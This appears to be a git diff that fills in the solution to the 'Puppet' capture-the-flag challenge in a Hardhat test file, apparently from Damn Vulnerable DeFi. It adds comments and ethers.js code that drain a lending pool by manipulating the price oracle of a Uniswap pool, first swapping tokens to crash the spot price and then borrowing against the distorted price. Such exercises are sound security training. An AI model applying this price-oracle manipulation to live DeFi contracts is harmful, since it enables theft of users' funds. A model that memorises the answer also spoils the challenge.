@@ -101,8 +101,28 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // 1. Swap all but 1 DVT to ETH using the Uniswap pool to push the ETH/DVT price down
+    //      - Attacker now has 34.9 ETH and 1 DVT post swap
+    //      - Uniswap pool now has 0.1 ETH and 1009 DVT
+    // 2. Attacker calls 'borrow()' while the oracle price for ETH/DVT is low and drains lending pool
+    //      - depositAmount = borrowAmount * ETH/DVT price * 2
+    //      - depositAmount = (100,000 DVT) * (0.1 ETH / 1009 DVT) * 2
+    //      - depositAmount = ~20 ETH 
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.constants.MaxUint256);
+        let tokenSwapAmount = ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.constants.WeiPerEther);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            tokenSwapAmount, 
+            1, 
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+        let attackerBalance = await ethers.provider.getBalance(attacker.address);
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE, 
+            {value: ethers.utils.parseEther("20")}
+        );
     });
 
     after(async function () {
